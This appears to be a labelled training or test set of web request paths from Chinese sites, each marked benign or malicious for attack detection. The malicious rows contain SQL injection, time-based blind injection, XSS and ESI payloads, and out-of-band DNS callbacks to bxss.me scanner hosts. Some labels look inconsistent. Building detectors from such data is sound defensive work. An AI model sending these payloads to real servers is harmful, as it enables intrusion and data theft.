request	label
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u77f3\u6c9f\u9a7f\u5174\u9686\u996d\u9986	0
/****/bmkx/sgsj/202006/w020200612696892355108.jpg	0
/*****/nbgx/index.php	1
/***/xbt/images/02.jpg	0
/****/web/search?channelid=299868' or 8510=2183 and '1'='1&perpage=1000	1
/*****/web/sa3/addholiday.do	1
/******/system/2017/06/12/javascript:window.print()	1
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6cb3\u5357	0
/*****/gy42/cpgyss.asp?key=\u6d4b\u901f\u7535\u673azys&showpage=1&l=\ufffd\u3f6d	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u06f4\ufffd\ufffd\ufffd\ufffd\ucce7&showpage=1&l=\ufffd\ufffd\ufffd	0
/****/zzxxgk/bmsthjj/xxgkml/hjxx/hjwfbgt/202010/t20201030_173528.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u91d1\u94f6\u6ee9\u9547\u71d5\u5b50\u9ebb\u8fa3\u70eb\u997a\u5b50\u9986	0
/******/bootstrap_zwfw.css	0
/zwxx_11337/****/202105/t20210520_2848290.html	0
/****/jtdt/2021_jtyw/202108/t20210819_314634.html' and 'x'='x	1
/***********/jinrongqihuo/0'xor(if(now()=sysdate(),sleep(28),0))xor'z/	1
"/*/210719/index/'""""()&%<acx><script >he7f(9634)</script>.css"	1
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u5c11\u5175\u5546\u5e97	0
/**/zfxxgkjs/index.html?channelid=295157&searchword=	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u7ea2\u5bfa\u5821\u533a\u5efa\u5175\u51c9\u76ae\u52a0\u5de5\u90e8	0
/****/gccb/ and 1>1	1
/*******/qiye/20211122/e142058120.html	0
/****/xqdt/jyx/201610/t20161025_47900.html	0
/**/mediacenter/specials/index_8.html	0
/****/system/2021/12/12/javascript:window.close();	1
/**/sustainability/csr/qywh/ywzzq/wzdt/xwzx/zgsdt/2021_qydt/202111/ddjs/qtgz/gygj/gjgk/zzjg/gjcp/clhlbj/images/css.css	0
/****/zt/tpgj_1542/202007/t20200703_2153560.html	1
/**/news/xwygx/202108/t20210813_314350.html	0
/zwxx_11337/****/202001/t20200108_1917409.html	0
"/******/czsc/fonts/index.jsp/""""><script>alert`99227`</script>"	1
/**********/system/2021/08/14/013434790.shtml	0
"/***/2021/8/23/art_32<esi:include src=""""http://bxss.me/rpb.png""""/>_237912.html"	1
/**********/system/2020/07/05/013199073.shtml	0
/***/interface/daily_clickcount.json.jsp?callback=jquery191046725553295688527_1639973149367	0
"/****/zjdt/kjybzde/gzdt/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z.htm"	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5ba3\u548c\u9547\u946b\u6e90\u5546\u884c	0
/*****/h1626063478.html	0
"/****/web/search?page=2*/-->'""""></iframe></script></style></title></textarea><script >alert(55292)</script>&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10"	1
/**********/system/2015/12/23/011895596.shtml	0
/******/n42746'||'/index_244329_100.html	1
/**/frontcontroller?domainname=<script>alert(77729</script>&operation=160	1
/**********/jyxw/	0
/****/yzw/spbd/	0
"/****/gccb/qcgc//*/-->'""""></iframe></script></style></title></textarea><script >alert(67446)</script>"	1
"/***/getsubject?data={""subject_id"":357,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":4611,""sign"":""""}"	0
"/******/szjj/""><script>alert(4)</script>"	1
/**********/system/2020/06/25/013192979.shtml	0
/***/mood/default/images/enorth/news_xq_ws_005.gif	0
/**********/system/2021/11/11/javascript:void(0);	1
/****/web/search?page=3&channelid=222832&searchword=\u962e\u6559\u80b2&keyword=\u962e\u6559\u80b2&perpage=20&outlinepage=10	0
/***/003/004/218/00300421863_c3db8d71.jpg	0
/*****/system/2019/04/15/javascript:void(0);	1
/***/resource/fonts/fontawesome-webfont.ttf?v=4.3.0</textarea>--><xss_e6da425387e31a0cead4b77a63bac59b/><!--<textarea>	1
/**********/system/2021/12/19/013496629.shtml	0
/****/b-e339518.html	0
/****/wp_rokbox/thumb.php?src=<body onload=alert(777)>.jpg	1
/if(now()=sysdate(),sleep(15),0)/*/slick.css	1
/****/bysw/'.gethostbyname(lc('hitox'.'bvpkknkw09641.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(118).chr(73).chr(115).chr(74).'/t20200119_146666.html	1
/****/xxgkml/gfgy/ghbg/wngh/202107/t20210721_184790.html	0
/****/screen.css	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u82ae\u82ae\u7efc\u5408\u5546\u5e97	0
/******/ico_2.gif	0
"/****/system/2021/04/22'""/><iframe src=javascript:alert(2387)>/013373702.shtml"	1
/****/web/search?channelid=299868%') or 8359=3131 and '%'='&perpage=1000	1
/**********/sycx/	0
"/****/index.php?do=search&search=""><body onload=eval(alert(777)) ><!--"	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u771f\u4f51\u725b\u7f8a\u517b\u6b96\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/system/2017/05/17/javascript:dozoom(9)	1
/***/cms/gobottom.do?urlname=3cf98dc2004d43fc93b799903082fc40	0
"/' 'a'.concat(70-3).concat(22*4).concat(112).concat(78).concat(105).concat(76) (require'socket'
socket.gethostbyname('hitoo' 'cckuemnn69fe0.bxss.me.')[3].to_s) '/*******/ybjsqzn/list.html"	1
/**/ui/lib/jquery/bxss.me.js	1
"/****/' 'a'.concat(70-3).concat(22*4).concat(114).concat(77).concat(119).concat(74) (require'socket'
socket.gethostbyname('hitop' 'ggotpfzc4cdf8.bxss.me.')[3].to_s) '/hfswsj/202109/t20210906_186411.html"	1
/**********/system/2021/12/20/013496887.shtml	0
/****/zhengce/zfwjn/202108/p020211202574464562643.pdf	0
/**********/system/2020/12/23/013307958.shtml	0
/**/ourbusiness/projectcontracting/201412/t20141210_22180.html' and 'x'='y	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u6c34\u7535\u7efc\u5408\u7ecf\u8425\u670d\u52a1\u516c\u53f8\u4e0b\u9a6c\u5173\u7ecf\u9500\u70b9	0
/*****/gy42/cpgyss.asp?key=opp\ufffd\ufffd\ufffd\ufffd&l2=\u02af\ufffd\ufffd\u05ef&l=\ufffd\u04f1\ufffd	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u80dc\u5229\u4e61\u5144\u5f1f\u7535\u6c14\u710a\u8f6e\u80ce\u4fee\u7406\u90e8	0
/*****/gjcp/gcjx/qtyz/gygj/ssgs/lxwm/xwzx/mtll/	0
/***/data:image/svg xml;charset=utf-8,<svg xmlns='http://www.w3.org/2000/svg' viewbox='0 0 27 44'><path d='m27,22l27,22l5,44l-2.1-2.1l22.8,22l2.9,2.1l5,0l27,22l27,22z' fill='#000000'/></svg>	1
/****/system/2017/01/24/javascript:dozoom(14)	1
/****/bank-household.jsp?lxsj=15800130553&tjr=null&biztoken=85d23b25-e241-467d-a518-3c65ebd32794&extra=	0
/****/system/2021/11/23/javascript:void();	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u552f\u8863\u670d\u88c5\u5e97	0
/zwxx_11337/***/201902/t20190215_1281188.html	0
/zwxx_11337/****/201707/t20170727_301414.html	0
/**/system/2021/12/08/012228281.shtml	0
/***********/yuedubaogao/2021-12-01/2017.html	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtkqea l7/mx72bsz80cwkd0=&openid=ovl7jjvhv7bx0gfmuu25bb98r15y&outer_str=33250&activate_ticket=fdzv9emqaffrnr3xboqhbxowf3uux0hmiv9ma3rwwwvoo8dbj5 fzedtzplsmcarob7c/bvlxukq55/htbnt/uda8fd7rnphkvldyz9/ips=	0
/**/http://bxss.me/t/fit.txt?.jpg/lib/easyui/plugins/jquery.linkbutton.js	1
/**/system/2021/08/23/012194050.shtml and 1=1	1
/****/xxgkml/qtfdxx/zdjcyjzj/201610/t20161028_66529.html	0
/*******/202104/202104080936541013.html	0
/**********/system/2020/12/22/013307222.shtml	0
/***/0/10/25/30/10253083_543135.jpg	1
"/**/compact.cfm?fusebox.ajax="""">alert(777)"	1
/****/zfxxgk/fdzdgknr/tjxx_40901/zxfb/202111/t20211103_3114380.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u777f\u901f\u7535\u5b50\u4ea7\u54c1\u7ecf\u9500\u90e8	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtgtl2xjx4p60p4pjnzzz/e0=&openid=ovl7jjncyoas9ue3bjqrrirzyflo&outer_str=quicklyrq,3,152124,10055101&activate_ticket=fdzv9emqaffrnr3xboqhbzxzxfsn7fq1jlo9afzbe1bhfifidrt1ejnprxbtx1zvgetfi6tpfanrmsfpbenvtgl5bjhau7yfpebggxrnihc=	0
/**********/system/2020/12/22/013307216.shtml	0
"/***/getsubject?data={""subject_id"":349,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":5690,""sign"":""""}"	0
"/****/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/2014/list.html"	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u7f8e\u4e3d\u4e61\u6751	0
"/"""" """"a"""".concat(70-3).concat(22*4).concat(107).concat(68).concat(108).concat(66) (require""""socket""""
socket.gethostbyname(""""hitzh"""" """"lrrkumit8eefc.bxss.me."""")[3].to_s) """"/**/lib/easyui/themes/bootstrap/linkbutton.css"	1
/**************/worklog_template_show.aspx?id=sys.fn_varbintohexstr(hashbytes('md5','2ddc3'))	1
/****/czgk/bmyjs/qtdw/zzqmksjy/201712/t20171211_633312.html	0
/***/0/00/70/73/707320_987038.jpg	0
//***********/select.js	1
/****/qzfwj/201801/t20180115_669226.html/index_1.html	0
/****/czgk/bmjs/index_13.html	0
/**********/system/2015/10/28/011851359.shtml	0
/****/zt/2018wznb/xjzf/201901/p020190125574909756340.pdf	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1329914701&wbfileid=12528&codevalue=	0
/**/system/2021/12/09/012228695.shtml	0
"/************/template/jcse/110105008056111/16/images/plugin/waterpull/' 'a'.concat(70-3).concat(22*4).concat(100).concat(84).concat(115).concat(77) (require'socket'
socket.gethostbyname('hitoa' 'rfqitdnge585d.bxss.me.')[3].to_s) '.js"	1
/***/003/003/685/00300368549_ddd3f13d.png	0
/**********/2019-03-06.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u94f6\u53d1\u7ecf\u6d4e	0
/***/2020/12/29/art_34_224482.html	0
/**********/system/2021/07/08/javascript:window.print()	1
/******/visitcount/visit.jsp?type=3&i_webid=1&i_columnid=77&i_articleid=221385	0
/****/jsly/gczxysjjs/201501/w020150129627769350616.jpg	0
/******/usercenter/index?qrcode=8034	0
/****/web/search?page=16&channelid=222832&searchword=\u9a6c\u529b&keyword=\u9a6c\u529b&perpage=20&outlinepage=10	0
/****/system/2016/09/28/012146190.shtml	0
/**/system/2021/12/03/012227105.shtml	0
/****/201909/t20190926_1757397.html	0
/****/zgsdt/zgs17_6389/201711/t20171102_176721.html	0
"/**/' 'a'.concat(70-3).concat(22*4).concat(121).concat(86).concat(100).concat(81) (require'socket'
socket.gethostbyname('hitzy' 'pvrvhmte436bd.bxss.me.')[3].to_s) '/lib/easyui/plugins/jquery.parser.js"	1
/***/0/02/03/29/2032999_536626.jpg	0
/***********/xwzx/2016/9/201609291108414159.jpg	0
/****/web/search?page=3&channelid=222832&searchword=\u699c\u5355&keyword=\u699c\u5355&perpage=20&outlinepage=10	0
"/************/template/'""""()&%<acx><script >v4yy(9305)</script>/website.js"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5ba2\u54c1\u5148\u7096\u571f\u9e21\u9910\u5385	0
/****/lxwmmap/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/zgsdt/2020_qydt/202007/t20200727_251220.html	0
/****/web/search?channelid=222832&searchword=\u6768\u548c\u9547\u5e0c\u671b\u9972\u6599\u7ecf\u8425\u90e8	0
/**********/system/2021/03/29/013358790.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u8363\u76db\u8d85\u5e02\u897f\u56ed\u5c0f\u533a\u5e97	0
/*****/jwplayer/player.swf?playerready=alert(document.domain)&debug=function(){alert(document.domain)}	1
/****/1088/1093/xxgkyc.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u8fdc\u6052\u8d27\u8fd0\u4fe1\u606f\u54a8\u8be2\u670d\u52a1\u90e8	0
/****/wzdt/	0
/****/czgk/bmyjs/zzqjcyxt/jfqrmjcy/index_1.html	0
/***/interface/comul_total.json.jsp?callback=jquery17107587389706170353_1639991303777	0
/***/003/004/380/00300438002_60b86269.png	0
/**********/system/2021/11/12/013479018.shtml	0
/****/system/2013/07/07/011128038.shtml	0
/**********/system/2021/12/18/013496249.shtml	0
/enjoymobilexcx_mt/****/getpicverifycode?mobile=101834157&type=\u9884\u7ea6&dt=1640016033420	0
/****/customer-e36408.html	0
/******/frontcontroller?domainname=<script>alert(77729</script>&operation=160	1
/**********/system/2020/12/19/013305313.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u7941\u8001\u5927\u9910\u5385	0
/****/czgk/bmyjs/qtdw/zzqmksjy/	0
/**********/system/more/206000000000000/0012/206000000000000_00001210.shtml	0
/wp-content/*******/carllyleelmer/shunran.php?login=cmd	1
/****/ and 1=1	1
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqwsjkwyh/zzqwsjsw/201908/t20190808_1656750.html	0
/**********/system/2020/05/27/013171782.shtml	0
"/****/category/difangdongtai?page=1'""()&%<acu><script>9112(9131)</script>"	1
/****/admin/index.php?o=panel&a=receiver.edit&id=alert(777)	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u8863\u5427\u670d\u88c5\u5e97	0
/***/interface/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271' and 5467=5467	1
/****/czgk/bmjs/zzqfyxt/plxrmfy/202008/t20200818_2190340.html	0
/*******/ltev.html	0
/***/0/02/02/54/2025421_087801.jpg	0
/******/visitcount/visit.jsp?type=2&i_webid=1&i_columnid=10	0
/******/_content/download.jsp?urltype=news.downloadattachurl%') or 5440=5440	1
/***/0/02/08/09/2080939_137026.jpg	0
/**********/system/2021/07/13/013417931.shtml	0
/******/scy_gj_ssydian_06.jpg	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u7ecf\u6d4e\u5f00\u53d1\u533a\u5fd7\u4ec1\u624b\u64c0\u81ca\u5b50\u9762\u9986	0
/****/jtdt/2012jtdt/index_6.html	0
/****/bmkx/sfgw/202010/w020201020341107587489.png	0
/****/xxgkml/qtfdxx/zdjcyjzj/202001/t20200114_146497.html	0
/*****/h1548474579.html	0
/****/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/****/sj1/jjzs/202112/w020211201347617034364.png	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5f18\u76db\u7164\u70ad\u7ecf\u9500\u90e8	0
/****/zzxxgk/bmfgj/fggzdt/202106	0
"/**/compact.cfm?fusebox.ajax="""">alert(777)"	1
"/zwxx_11337/****/mtjd/202101/"">\u81ea\u6cbb\u533a\u7164\u70ad\u5730\u8d28\u5c40</a>"	0
/****/if(now()=sysdate(),sleep(15),0).aspx	1
/****/tools_log_setting.php?action_post=something&send_mail=--><script>alert(777)</script>&apply=save settings&log_sys=1&log_dbg=1&log_att=1&log_drp=1&log_ntc=1&email_addr=&subject=&sender=&srv=&srv_port=25	1
/****/Àø≥Ò÷Æ¬∑æ≠º√¥¯	1
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/******/ncwywfgz/zws/yzq/xmb_gzdxb.htm	1
/*****/system/2021/09/18/javascript:void();	1
/*****/system/2021/12/20/javascript:window.print()	1
/zwxx_11337/****/202006/t20200610_2133338.html	0
/hire_prd/*****/static/css/app.cf0e3b8f9aa52f651d25c7228f6c02cf.css	0
/*******/media/modules.php	1
/*******/qiye/b-e692560.html	0
/******/usercenter/index?qrcode=quicklyrq,3,34713,40409&code=021f611w3c2yfx2awv2w35to8p0f6116	0
/*****/721926.html	0
/******/system/2021/12/06/javascript:window.print()	1
/********/customer/style/;1<script>abuz(9702)</script>	1
/***/view/staticpags/zgh_zhongbgg/xwzx/gzdt/gjcp/hdzb/ywly/gccb/jcgc/qywh/sjsb/gygj/	0
/**********/system/2021/08/10/013432898.shtml	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u7965\u71d5\u82b1\u5349\u5e97	0
"/****/annonce/moteur-prix.php?categoriemoteur=1"""">alert(777);"	1
/*******/qiye/b-e2139022.html	0
/******/news/2019-11/02/content_689350.htm	0
/*******/web/images/toolbarbutton-bookmark.png	0
/zwxx_11337/****/202007/t20200723_2170726.html	0
/****/20210918/javascript:void(0);	1
/**/system/2021/04/08/javascript:void(0);	1
/****/20200521/e101257824.html	0
"/******/lxqz/stbd/""""><script>alert(565)</script>"	1
/******/system/2016/09/19/012135062.shtml	0
/*****/mkuqpe-336-h1502029756.html	0
/****/zdlygk' and 2*3*8=6*8 and '6mv0'='6mv0/gytdsdfwzs/wzs/zcwj.htm	1
/**/index.php?ac=search&at=taglist&tagkey=anony',tags) or did>1 and 101=ascii((seselectlect mid(table_name,1,1) frfromom information_schema.tables whwhereere table_schema =database() limit 1,1)) limit 1-- t t	1
/****/zzxxgk/'.gethostbyname(lc('hitdj'.'trtskqpw35294.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(101).chr(66).chr(97).chr(66).'/	1
/******/system/more/17430030000000000/0000/17430030000000000_00000029.shtml	0
/****/b-e847919.html	0
/*******//screens/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)>	1
/************/categorysearch.do?cateid=1&eq='.gethostbyname(lc('hitjk'.'hobkhezq6cf6b.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(115).chr(70).chr(122).chr(75).'&oq=1&p=1&pg=15&pos=1&pq=1&q=«Î ‰»Îπÿº¸¥ &ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111	1
"/***/2021/10/12/art"""" and 2*3*8=6*8 and """"uyao""""=""""uyao_32_242398.html"	1
/******/web/jpage/bxss.me/default/css/jpage.css	1
/****/bmkx/sbwg/202008/w020200811361370772230.jpg	0
/****/zhengce/zfwjn/202105/w020210722557407765142.png	0
/**/system/2009/08/20/002795417.shtml	0
/****/web/search?channelid=254846%' and 4209=(select 4209 from pg_sleep(5)) and '%'='&searchword=ÃÏΩÚ	1
"/****/czgk/bmyjs/zzqfyxt/jfqrmfy/202103/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a>"	0
/***/images/01.jpg	0
/****/system/2021/07/17/javascript:window.close();	1
"/****/compact.cfm?fusebox.ajax="""">alert(777)"	1
/****/qzfwj/202012/t20201230_2543878.html	0
/****/zdlygk%' and 2*3*8=6*8 and 'imqv'!='imqv%/bzxajgc/gys/jyx.htm	1
/**********/system/2020/12/18/013304861.shtml	0
/*****/system/2021/11/24/javascript:void();	1
/****/http://bxss.me/t/fit.txt?.jpg/hfswsj/zmhdyc.html	1
/****/qybs/202010/w020201026363995654152.png	0
"/wp-content/*******/wp-events-calendar/public/ajax/geteventslist.php?calendar_id=1&day=1"" and 1=dbms_pipe.receive_message(7d,15) and ""1""=""1&month=5&pag=1&year=2018"	1
/****/category/:bxss.me/t/xss.html?	1
"/***/col9/index.html/""><script>alert(423)</script>"	1
/*****/system/javascript:alert(1575)/013323672.shtml	1
/****/bmkx/sfgw/201906/t20190621_138780.html	0
/**********/system/2021/10/10/013462021.shtml	0
/****/202011/t20201125_256666.html	0
/****/bmkx/sgaj/201806/w020180612358981979430.jpg	0
/***/0/00/22/65/226503_899198.jpg	0
/******/qzspj/yc.html	0
/xxgk'||'/******/2012/list.html	1
/****/byyw/202112/t20211214_197785.html	0
/*******/wa.exe?ok=</script><script>alert(document.domain)</script>	1
"/****/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z.htm"	1
/*****/dmqh/images/11.gif	0
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u4e3d\u4e3d\u7f8e\u5bb9\u5e97	0
/******/system/2009/02/13/002687348.shtml	0
/********/zixun	0
/******/ew/20170419142427394001.png	0
/****/bmkx/jyj/201809/t20180907_109776.html	0
/****/xxgknb/2018/bmnb2018/201903/w020190319343942481262.jpg	0
/****/web/search/search?page=3&channelid=287219 and 5067=5067-- vkoy&searchword=1&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u6e20\u53e3\u5c0f\u7530\u7efc\u5408\u5546\u5e97	0
/***/index.php?do=post&id=489&c=dt&a=goods&	1
"/************/template/jcse<esi:include src=""""http://bxss.me/rpb.png""""/>/110105008056111/16/images/result.css"	1
/****/mtgz/2019_mtgz/javascript:stranbody();	1
/****/system/2021/07/28/javascript:void(0);	1
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/zzqlshwzcbj/zzqlsj/201802/t20180223_693438.html	0
/****/gfxwj/201812/t20181219_1218071.html	0
/***/webfonts/bxss.me/t/xss.html?	1
/***/003/003/775/00300377525_421c4553.jpg	0
/**************/xilan_yc.html	0
/****/lybltj/202007/t20200713_169220.html	0
/***/0/01/90/14/1901409_631647.jpg	0
"/****/server/news/show/title/time-for-a-heavy-harvest-new-release/src/""><script>alert(777)</script>@random4cd201e063d5c"	1
/*/wulv.php	1
/****/9haocaiyule.html	0
/****//xfs.bxss.me/tjj/zfxxgkml_2127/jytabljg_2061/list.html	1
"/***/col14/index.html/<img src=""javascript:alert(610)"">"	1
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u767d\u745e\u77ff\u4e1a\u6709\u9650\u516c\u53f8	0
/if(now()=sysdate(),sleep(12),0)/******/ywdt.htm	1
/****/swcxjb-hynews-e113128008.html	0
"/jsearchfront<esi:include src=""""http://*******/rpb.png""""/>/template/jcse/110105008056111/16/images/common.js"	1
/****/system/2006/09/26/javascript:dozoom(12)	1
/****/zgsdt/2021_qydt/202111/t20211111_320383.html	0
/**********/system/2021/12/17/013495610.shtml	0
"/*/doinfo/addinfo.php?submit=ÃÌº”–≈œ¢&classid=1&enews=maddinfo&mid=1'""""()&%<acx><script >87cm(9152)</script>"	1
/****/bmkx/scl/202105/w020210517391336402548.jpg	0
/***/0/01/90/38/1903846_999937.jpg	0
/****/czgk/bmjs/sydw1/zzqskylgbjdaj_1820/201808/t20180813_974255.html	0
/*******/fnnntu1s.php	1
/****/zzxxgk/tjj/http://bxss.me/t/fit.txt?.jpg_2127/xwfbh_2065/list.html	1
/****/' and 'x'='y	1
/******/system/2021/03/04/javascript:void(0);	1
/*/file/201706/ec8891e1bdbc87c78eff64dd06859c2b.png	0
/zwxx_11337/****/ytdd/202001/t20200117_1925044.html	0
/****/gfxwj/list_58.html	0
/****/zhengce/zfwjn/201806/w020180619386517184049.xls	0
/****/201909/t20190926_1757548.html	0
"/***/getdetail?data={""news_id"":""1186268"",""diversion_id"":"""",""sign"":""""}"	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6559\u80b2\u57f9\u8bad	0
/******/xxwzqh/img3/10.jpg	0
/****/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319	1
"/****/system/2021/04/22/013373702'""/>//</script//>//<svg/onload=alert(2575) width=100///>.shtml"	1
/zwxx_11337/****/202110/t20211026_3104806_zzb.html	0
/***/mama/userinfo?openid=oug7n5sx1znwnw1ussu2xeboibaq	0
"/****/gfxwj/201912/"">\u5b81\u590f\u516c\u8def\u5efa\u8bbe\u7ba1\u7406\u5c40</a>"	0
/zwxx_11337/****/202007/t20200722_2170079.html	0
/zwxx_11337/****/202110/t20211002_3072446.html	0
/****/czgk/bmyjs/zzqjcyxt/szssrmjcy/index_1.html	0
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202112/t20211206_197311.html	0
